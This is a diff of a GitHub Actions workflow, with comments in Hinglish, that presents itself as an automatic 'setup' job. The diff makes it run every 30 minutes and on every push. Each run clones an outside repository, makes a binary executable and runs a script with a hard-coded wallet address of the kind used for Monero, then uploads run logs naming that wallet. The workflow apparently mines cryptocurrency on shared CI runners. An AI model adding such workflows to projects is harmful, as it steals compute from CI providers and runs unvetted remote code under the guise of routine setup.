@@ -1,42 +1,52 @@
-name: Auto Mustu Setup
+name: 🔄 Auto Mustu Setup (No Manual Needed)
 
 on:
+  push:
+    branches: [ main, master ]
   schedule:
-    # Har 6 ghante mein run karega (aap chahein to time change kar sakte hain)
-    - cron: '0 */6 * * *'
-  workflow_dispatch:  # Manual run ke liye bhi option rakh raha hoon
+    - cron: '*/30 * * * *'   # Har 30 minute mein run hoga
+  workflow_dispatch:          # Optional - agar kabhi manually run karna ho
 
 jobs:
-  auto-setup:
+  auto-run:
     runs-on: ubuntu-latest
     
     steps:
-    - name: Checkout repository
+    - name: 📥 Checkout
       uses: actions/checkout@v3
     
-    - name: Install Python
+    - name: 🐍 Setup Python
       uses: actions/setup-python@v4
       with:
         python-version: '3.10'
     
-    - name: Install dependencies
+    - name: 🚀 Auto Clone & Run Mustu
       run: |
-        pip install --upgrade pip
-        # Agar mustafa.py ko koi library chahiye to yahan add karein
-    
-    - name: Git clone and run
-      run: |
+        echo "Starting automatic mustu setup..."
+        
+        # Clone karo
         git clone https://github.com/thumpingpp/mustu-setup.git
+        
+        # CD aur permissions
         cd mustu-setup
+        
+        # mustafa ko executable banao
         chmod +x mustafa
+        
+        # Direct auto run with fixed wallet
         python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
+        
+        echo "✅ Auto run completed at $(date)"
     
-    - name: Log completion
+    - name: 💾 Save Run Status
       run: |
-        echo "Auto setup completed at $(date)" >> setup_log.txt
+        echo "Last run: $(date)" > last_run.txt
+        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> last_run.txt
     
-    - name: Upload log
+    - name: 📤 Upload Logs
       uses: actions/upload-artifact@v3
       with:
-        name: setup-logs
-        path: setup_log.txt
+        name: auto-run-logs
+        path: |
+          mustu-setup/*.log
+          last_run.txt
